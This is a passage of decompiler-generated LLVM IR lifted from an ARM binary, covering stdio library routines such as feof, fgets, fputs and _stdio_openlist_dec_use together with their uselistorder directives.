  store i32 %v2_149d0, i32* @r4, align 4
  store i32 %v6_14498, i32* @r5, align 4
  store i32 %v27_14498, i32* @lr, align 4
  %v1_149d4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_149d4

; uselistorder directives
  uselistorder i32 %v3_149a8, { 1, 0 }
  uselistorder i32 %v1_14964, { 1, 2, 0 }
  uselistorder i32 %v2_14900, { 1, 0 }
  uselistorder i32 %v1_14900, { 1, 0, 2 }
  uselistorder i32 %v0_14920, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_148f8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_148bc, { 1, 2, 0 }
  uselistorder i32 %v0_148ac, { 1, 0 }
  uselistorder i32 %v1_14888, { 1, 0, 2 }
  uselistorder i32 %v1_147fc, { 1, 2, 0 }
  uselistorder i32 %v1_147e4, { 1, 0 }
  uselistorder i32 %v2_147cc, { 2, 1, 0 }
  uselistorder i32 %v1_147b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_147a8, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_1478c, { 1, 0, 2 }
  uselistorder i32 %v2_14774, { 1, 0, 2, 3 }
  uselistorder i32 %v3_14768, { 2, 1, 0 }
  uselistorder i32 %v1_14728, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14718.pre, { 0, 2, 1 }
  uselistorder i32 %v2_146f4, { 1, 0 }
  uselistorder i32 %v5_14654, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14654, { 1, 0 }
  uselistorder i32 %v0_1465876, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_145fc, { 1, 0 }
  uselistorder i32 %v0_1461c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_145e0, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_145c8, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_145b8, { 1, 0 }
  uselistorder i32 %v3_145b0, { 0, 2, 1 }
  uselistorder i8 %v2_145b0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_14630, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_14574, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14560, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14548, { 1, 0 }
  uselistorder i32 %v3_14554.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_144fc, { 0, 2, 1 }
  uselistorder i32 %v2_144e8, { 1, 0, 2 }
  uselistorder i32 %v0_1449c, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 2, 1, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 12, 11, 13, 10, 2, 3, 9, 4, 14, 5, 6, 7, 8, 0, 1, 16 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 38, { 1, 0, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 2, 1, 3 }
  uselistorder i32 1004, { 1, 2, 0, 3 }
  uselistorder i32 -38348, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 -40, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_149cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_149c8, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_14994, { 1, 0 }
  uselistorder label %dec_label_pc_14960, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14958, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14914, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_148cc, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_146e0, { 1, 0 }
  uselistorder label %dec_label_pc_14694, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_14610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1460c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_145ac, { 1, 0 }
  uselistorder label %dec_label_pc_145a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_145ac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1454c, { 1, 0 }
  uselistorder label %dec_label_pc_14520, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_14a08 = load i32, i32* @r4, align 4
  store i32 %v3_14a08, i32* %stack_var_-20, align 4
  %v2_14a0c = add i32 %tmp, 52
  %v3_14a0c = inttoptr i32 %v2_14a0c to i32*
  %v4_14a0c = load i32, i32* %v3_14a0c, align 4
  store i32 87520, i32* %r5.global-to-local, align 4
  %v1_14a14 = sub i32 1, %v4_14a0c
  %v2_14a14 = icmp ult i32 %v4_14a0c, 2
  br i1 %v2_14a14, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14a14, %entry ]
  %v0_14a1c = phi i32 [ 0, %bb ], [ %v1_14a14, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_14a1c = icmp eq i32 %v0_14a1c, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_14a1c, label %dec_label_pc_14a68, label %dec_label_pc_14a30

dec_label_pc_14a30:                               ; preds = %thread-pre-split
  %v2_14a34 = add i32 %tmp, 56
  store i32 %v2_14a34, i32* %r4.global-to-local, align 4
  %v4_14a48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14a48)
  %v0_14a5c = load i32, i32* %r5.global-to-local, align 4
  %v2_14a5c = add i32 %v0_14a5c, 16
  %v3_14a5c = inttoptr i32 %v2_14a5c to i32*
  %v4_14a5c = load i32, i32* %v3_14a5c, align 4
  store i32 %v4_14a5c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14a5c)
  %v0_14a68.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_14a6c.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_14a68.pre, 0
  br label %dec_label_pc_14a68

dec_label_pc_14a68:                               ; preds = %thread-pre-split, %dec_label_pc_14a30
  %v0_14a6c = phi i32 [ %tmp, %thread-pre-split ], [ %v0_14a6c.pre, %dec_label_pc_14a30 ]
  %v0_14a68 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_14a30 ]
  %v1_14a6c = inttoptr i32 %v0_14a6c to i16*
  %v2_14a6c = load i16, i16* %v1_14a6c, align 2
  %v3_14a6c = zext i16 %v2_14a6c to i32
  store i32 %v3_14a6c, i32* %r4.global-to-local, align 4
  br i1 %v0_14a68, label %dec_label_pc_14a68..thread4_crit_edge, label %bb15

dec_label_pc_14a68..thread4_crit_edge:            ; preds = %dec_label_pc_14a68
  %v0_14a84.pre = load i32, i32* @ip, align 4
  br label %.thread4

bb15:                                             ; preds = %dec_label_pc_14a68
  %v1_14a7c = load i32, i32* %r5.global-to-local, align 4
  %v3_14a7c = add i32 %v1_14a7c, 24
  %v4_14a7c = inttoptr i32 %v3_14a7c to i32*
  %v5_14a7c = load i32, i32* %v4_14a7c, align 4
  store i32 %v5_14a7c, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14a68..thread4_crit_edge, %bb15
  %v0_14a84 = phi i32 [ %v0_14a84.pre, %dec_label_pc_14a68..thread4_crit_edge ], [ %v5_14a7c, %bb15 ]
  %v2_14a84 = xor i1 %v0_14a68, true
  call void @__pseudo_cond_branch(i1 %v2_14a84, i32 %v0_14a84)
  %v0_14a88 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a88 = and i32 %v0_14a88, 4
  %v2_14a90 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_14a90, i32* @r4, align 4
  ret i32 %v1_14a88

; uselistorder directives
  uselistorder i1 %v0_14a68, { 1, 0 }
  uselistorder i32 %v1_14a14, { 1, 0 }
  uselistorder i32 %v4_14a0c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_14a68, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_14a9c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14a9c:
  %v0_14a9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14a9c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14a9c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14a9c, %bb
  %v10_14aa8 = phi i32 [ %arg1, %dec_label_pc_14a9c ], [ 0, %bb ]
  ret i32 %v10_14aa8

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_14aac = load i32, i32* @r4, align 4
  store i32 %v3_14aac, i32* %stack_var_-28, align 4
  %v6_14aac = load i32, i32* @r5, align 4
  %v9_14aac = load i32, i32* @r6, align 4
  %v12_14aac = load i32, i32* @r7, align 4
  %v21_14aac = load i32, i32* @lr, align 4
  %v1_14ab0 = add i32 %arg3, 52
  %v2_14ab0 = inttoptr i32 %v1_14ab0 to i32*
  %v3_14ab0 = load i32, i32* %v2_14ab0, align 4
  %v1_14ab8 = sub i32 1, %v3_14ab0
  %v2_14ab8 = icmp ult i32 %v3_14ab0, 2
  br i1 %v2_14ab8, label %bb16, label %bb

bb:                                               ; preds = %entry
  br label %bb16

bb16:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14ab8, %entry ]
  %v0_14ac0 = phi i32 [ 0, %bb ], [ %v1_14ab8, %entry ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_14ac0 = icmp eq i32 %v0_14ac0, 0
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_14ac0, label %dec_label_pc_14b14, label %dec_label_pc_14adc

dec_label_pc_14adc:                               ; preds = %bb16
  %v1_14ae0 = add i32 %arg3, 56
  store i32 %v1_14ae0, i32* @r4, align 4
  %v4_14af4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14af4)
  %v0_14b08 = load i32, i32* @r5, align 4
  %v2_14b08 = add i32 %v0_14b08, 16
  %v3_14b08 = inttoptr i32 %v2_14b08 to i32*
  %v4_14b08 = load i32, i32* %v3_14b08, align 4
  store i32 %v4_14b08, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_14b14.913 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14b08)
  %v0_14b14.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_14b18.pre = load i32, i32* @r7, align 4
  %v0_14b1c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14b14

dec_label_pc_14b14:                               ; preds = %bb16, %dec_label_pc_14adc
  %v0_14b1c = phi i32 [ %arg3, %bb16 ], [ %v0_14b1c.pre, %dec_label_pc_14adc ]
  %v0_14b18 = phi i32 [ %arg2, %bb16 ], [ %v0_14b18.pre, %dec_label_pc_14adc ]
  %v0_14b14 = phi i32 [ %arg1, %bb16 ], [ %v0_14b14.pre, %dec_label_pc_14adc ]
  %v3_14b20 = inttoptr i32 %v0_14b14 to i8*
  %v4_14b20 = call i32 @__GI_fgets_unlocked(i8* %v3_14b20, i32 %v0_14b18, i32 %v0_14b1c)
  %v0_14b24 = load i32, i32* %sl.global-to-local, align 4
  %v2_14b24 = icmp eq i32 %v0_14b24, 0
  store i32 %v4_14b20, i32* %r4.global-to-local, align 4
  br i1 %v2_14b24, label %dec_label_pc_14b14..thread3_crit_edge, label %bb17

dec_label_pc_14b14..thread3_crit_edge:            ; preds = %dec_label_pc_14b14
  %v0_14b40.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_14b14
  %v1_14b38 = load i32, i32* @r5, align 4
  %v3_14b38 = add i32 %v1_14b38, 24
  %v4_14b38 = inttoptr i32 %v3_14b38 to i32*
  %v5_14b38 = load i32, i32* %v4_14b38, align 4
  store i32 %v5_14b38, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14b14..thread3_crit_edge, %bb17
  %v0_14b40 = phi i32 [ %v0_14b40.pre, %dec_label_pc_14b14..thread3_crit_edge ], [ %v5_14b38, %bb17 ]
  %v2_14b40 = xor i1 %v2_14b24, true
  call void @__pseudo_cond_branch(i1 %v2_14b40, i32 %v0_14b40)
  %v0_14b44 = load i32, i32* %r4.global-to-local, align 4
  %v2_14b4c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14b4c, i32* @r4, align 4
  store i32 %v6_14aac, i32* @r5, align 4
  store i32 %v9_14aac, i32* @r6, align 4
  store i32 %v12_14aac, i32* @r7, align 4
  store i32 %v21_14aac, i32* @lr, align 4
  ret i32 %v0_14b44

; uselistorder directives
  uselistorder i32 %v3_14ab0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14b14, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_14b58(i32 %arg1) local_unnamed_addr {
dec_label_pc_14b58:
  %v0_14b58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14b58, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14b58
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14b58, %bb
  %v10_14b64 = phi i32 [ %arg1, %dec_label_pc_14b58 ], [ 0, %bb ]
  ret i32 %v10_14b64

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14b68 = load i32, i32* @r4, align 4
  store i32 %v3_14b68, i32* %stack_var_-24, align 4
  %v6_14b68 = load i32, i32* @r5, align 4
  %v9_14b68 = load i32, i32* @r6, align 4
  %v12_14b68 = load i32, i32* @r7, align 4
  %v15_14b68 = load i32, i32* @r8, align 4
  %v18_14b68 = load i32, i32* @lr, align 4
  %v1_14b6c = add i32 %arg2, 52
  %v2_14b6c = inttoptr i32 %v1_14b6c to i32*
  %v3_14b6c = load i32, i32* %v2_14b6c, align 4
  %v1_14b74 = sub i32 1, %v3_14b6c
  %v2_14b74 = icmp ult i32 %v3_14b6c, 2
  br i1 %v2_14b74, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14b74, %entry ]
  %v0_14b7c = phi i32 [ 0, %bb ], [ %v1_14b74, %entry ]
  store i32 %storemerge, i32* @r8, align 4
  %v2_14b7c = icmp eq i32 %v0_14b7c, 0
  store i32 %arg2, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_14b7c, label %dec_label_pc_14bcc, label %dec_label_pc_14b94

dec_label_pc_14b94:                               ; preds = %thread-pre-split
  %v1_14b98 = add i32 %arg2, 56
  store i32 %v1_14b98, i32* @r4, align 4
  %v4_14bac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14bac)
  %v0_14bc0 = load i32, i32* @r5, align 4
  %v2_14bc0 = add i32 %v0_14bc0, 16
  %v3_14bc0 = inttoptr i32 %v2_14bc0 to i32*
  %v4_14bc0 = load i32, i32* %v3_14bc0, align 4
  store i32 %v4_14bc0, i32* @ip, align 4
  store i32 84940, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14bc0)
  %v0_14bcc.pre = load i32, i32* @r7, align 4
  %v0_14bd0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14bcc

dec_label_pc_14bcc:                               ; preds = %thread-pre-split, %dec_label_pc_14b94
  %v0_14bd0 = phi i32 [ %arg2, %thread-pre-split ], [ %v0_14bd0.pre, %dec_label_pc_14b94 ]
  %v0_14bcc = phi i32 [ %arg1, %thread-pre-split ], [ %v0_14bcc.pre, %dec_label_pc_14b94 ]
  %v2_14bd4 = inttoptr i32 %v0_14bcc to i8*
  %v3_14bd4 = call i32 @__GI_fputs_unlocked(i8* %v2_14bd4, i32 %v0_14bd0)
  %v0_14bd8 = load i32, i32* @r8, align 4
  %v2_14bd8 = icmp eq i32 %v0_14bd8, 0
  store i32 %v3_14bd4, i32* %r4.global-to-local, align 4
  br i1 %v2_14bd8, label %dec_label_pc_14bcc..thread6_crit_edge, label %bb16

dec_label_pc_14bcc..thread6_crit_edge:            ; preds = %dec_label_pc_14bcc
  br label %.thread6

bb16:                                             ; preds = %dec_label_pc_14bcc
  %v1_14bec = load i32, i32* @r5, align 4
  %v3_14bec = add i32 %v1_14bec, 24
  %v4_14bec = inttoptr i32 %v3_14bec to i32*
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14bcc..thread6_crit_edge, %bb16
  %v0_14bf4.in = phi i32* [ @ip, %dec_label_pc_14bcc..thread6_crit_edge ], [ %v4_14bec, %bb16 ]
  %v0_14bf4 = load i32, i32* %v0_14bf4.in, align 4
  %v2_14bf4 = xor i1 %v2_14bd8, true
  call void @__pseudo_cond_branch(i1 %v2_14bf4, i32 %v0_14bf4)
  %v0_14bf8 = load i32, i32* %r4.global-to-local, align 4
  %v2_14c00 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14c00, i32* @r4, align 4
  store i32 %v6_14b68, i32* @r5, align 4
  store i32 %v9_14b68, i32* @r6, align 4
  store i32 %v12_14b68, i32* @r7, align 4
  store i32 %v15_14b68, i32* @r8, align 4
  store i32 %v18_14b68, i32* @lr, align 4
  ret i32 %v0_14bf8

; uselistorder directives
  uselistorder i32 %v1_14b74, { 1, 0 }
  uselistorder i32 %v3_14b6c, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_14bcc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_14c0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c0c:
  %v0_14c0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c0c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14c0c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14c0c, %bb
  %v10_14c18 = phi i32 [ %arg1, %dec_label_pc_14c0c ], [ 0, %bb ]
  ret i32 %v10_14c18

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14c1c = load i32, i32* @r4, align 4
  store i32 %v3_14c1c, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r6.global-to-local, align 4
  %v4_14c2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 36) to i32*), align 4
  store i32 %v4_14c2c, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_14c34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 112) to i32*), align 4
  store i32 %v4_14c34, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_14c40 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  store i32 %v4_14c40, i32* %r7.global-to-local, align 4
  %v2_14c4c = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_14c40)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_14c60 = load i32, i32* %r6.global-to-local, align 4
  %v2_14c60 = add i32 %v0_14c60, 16
  %v3_14c60 = inttoptr i32 %v2_14c60 to i32*
  %v4_14c60 = load i32, i32* %v3_14c60, align 4
  store i32 %v4_14c60, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14c60)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_14c70 = load i32, i32* %r6.global-to-local, align 4
  %v2_14c70 = add i32 %v0_14c70, 12
  %v3_14c70 = inttoptr i32 %v2_14c70 to i32*
  %v4_14c70 = load i32, i32* %v3_14c70, align 4
  store i32 %v4_14c70, i32* %r3.global-to-local, align 4
  %v1_14c74 = inttoptr i32 %v4_14c70 to i32*
  %v2_14c74 = load i32, i32* %v1_14c74, align 4
  store i32 %v2_14c74, i32* %r3.global-to-local, align 4
  %v7_14c78 = icmp eq i32 %v2_14c74, 1
  br i1 %v7_14c78, label %dec_label_pc_14c80, label %dec_label_pc_14d40

dec_label_pc_14c80:                               ; preds = %entry
  store i32 52, i32* %r3.global-to-local, align 4
  %v2_14c84 = add i32 %v0_14c70, 52
  %v3_14c84 = inttoptr i32 %v2_14c84 to i32*
  %v4_14c84 = load i32, i32* %v3_14c84, align 4
  store i32 %v4_14c84, i32* %r3.global-to-local, align 4
  %v1_14c88 = inttoptr i32 %v4_14c84 to i32*
  %v2_14c88 = load i32, i32* %v1_14c88, align 4
  store i32 %v2_14c88, i32* %r3.global-to-local, align 4
  %tmp32 = icmp slt i32 %v2_14c88, 1
  br i1 %tmp32, label %dec_label_pc_14d40, label %dec_label_pc_14c94

dec_label_pc_14c94:                               ; preds = %dec_label_pc_14c80
  store i32 100, i32* %r3.global-to-local, align 4
  %v2_14c98 = add i32 %v0_14c70, 100
  %v3_14c98 = inttoptr i32 %v2_14c98 to i32*
  %v4_14c98 = load i32, i32* %v3_14c98, align 4
  store i32 %v4_14c98, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14c40)
  call void @__pseudo_branch(i32 %v4_14c60)
  %v0_14cc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cc0 = add i32 %v0_14cc0, 48
  %v3_14cc0 = inttoptr i32 %v2_14cc0 to i32*
  %v4_14cc0 = load i32, i32* %v3_14cc0, align 4
  store i32 %v4_14cc0, i32* %r3.global-to-local, align 4
  %v1_14cc4 = inttoptr i32 %v4_14cc0 to i32*
  %v2_14cc4 = load i32, i32* %v1_14cc4, align 4
  store i32 %v2_14cc4, i32* %r4.global-to-local, align 4
  store i32 48, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_14d1013 = icmp eq i32 %v2_14cc4, 0
  br i1 %v2_14d1013, label %dec_label_pc_14d1c, label %dec_label_pc_14cd4

dec_label_pc_14cd4:                               ; preds = %dec_label_pc_14c94, %dec_label_pc_14d0c
  %v0_14cf84 = phi i32 [ %v0_14d0c, %dec_label_pc_14d0c ], [ %v2_14cc4, %dec_label_pc_14c94 ]
  %v1_14cd4 = inttoptr i32 %v0_14cf84 to i16*
  %v2_14cd4 = load i16, i16* %v1_14cd4, align 2
  %v3_14cd4 = zext i16 %v2_14cd4 to i32
  store i32 %v3_14cd4, i32* %r3.global-to-local, align 4
  %v2_14cd8 = and i32 %v3_14cd4, 32816
  %v7_14cdc = icmp eq i32 %v2_14cd8, 48
  %v1_14ce0 = add i32 %v0_14cf84, 32
  %v2_14ce0 = inttoptr i32 %v1_14ce0 to i32*
  %v3_14ce0 = load i32, i32* %v2_14ce0, align 4
  store i32 %v3_14ce0, i32* %r5.global-to-local, align 4
  br i1 %v7_14cdc, label %dec_label_pc_14cec, label %.thread23

.thread23:                                        ; preds = %dec_label_pc_14cd4
  store i32 %v0_14cf84, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d0c

dec_label_pc_14cec:                               ; preds = %dec_label_pc_14cd4
  %v0_14cec = load i32, i32* %r7.global-to-local, align 4
  %v2_14cec = icmp eq i32 %v0_14cec, 0
  br i1 %v2_14cec, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14cec
  %v1_14cf0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cf0 = load i32, i32* %r8.global-to-local, align 4
  %v3_14cf0 = add i32 %v2_14cf0, %v1_14cf0
  %v4_14cf0 = inttoptr i32 %v3_14cf0 to i32*
  %v5_14cf0 = load i32, i32* %v4_14cf0, align 4
  store i32 %v5_14cf0, i32* %r3.global-to-local, align 4
  %v3_14cf4 = inttoptr i32 %v5_14cf0 to i32*
  store i32 %v3_14ce0, i32* %v3_14cf4, align 4
  %v0_14cf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14cf8 = inttoptr i32 %v0_14cf8 to i16*
  %v2_14cf8 = load i16, i16* %v1_14cf8, align 2
  %v3_14cf8 = zext i16 %v2_14cf8 to i32
  store i32 %v3_14cf8, i32* %r3.global-to-local, align 4
  br label %bb33

bb:                                               ; preds = %dec_label_pc_14cec
  %v2_14cf810 = load i16, i16* %v1_14cd4, align 2
  %v3_14cf811 = zext i16 %v2_14cf810 to i32
  store i32 %v3_14cf811, i32* %r3.global-to-local, align 4
  %v3_14cfc = add i32 %v0_14cec, 32
  %v4_14cfc = inttoptr i32 %v3_14cfc to i32*
  store i32 %v3_14ce0, i32* %v4_14cfc, align 4
  %v0_14d00.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %.thread, %bb
  %v0_14d00 = phi i32 [ %v3_14cf8, %.thread ], [ %v0_14d00.pre, %bb ]
  %v1_14d00 = and i32 %v0_14d00, 8192
  %v2_14d00 = icmp eq i32 %v1_14d00, 0
  br i1 %v2_14d00, label %bb35, label %bb34

bb34:                                             ; preds = %bb33
  br label %bb35

bb35:                                             ; preds = %bb33, %bb34
  %v1_14d08 = xor i1 %v2_14d00, true
  call void @__pseudo_cond_branch(i1 %v1_14d08, i32 ptrtoint (i32* @global_var_16e04.850 to i32))
  %v0_14d0c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14d0c

dec_label_pc_14d0c:                               ; preds = %.thread23, %bb35
  %v0_14d0c = phi i32 [ %v0_14d0c.pre, %bb35 ], [ %v3_14ce0, %.thread23 ]
  store i32 %v0_14d0c, i32* %r4.global-to-local, align 4
  %v2_14d10 = icmp eq i32 %v0_14d0c, 0
  br i1 %v2_14d10, label %dec_label_pc_14d10.dec_label_pc_14d1c_crit_edge, label %dec_label_pc_14cd4

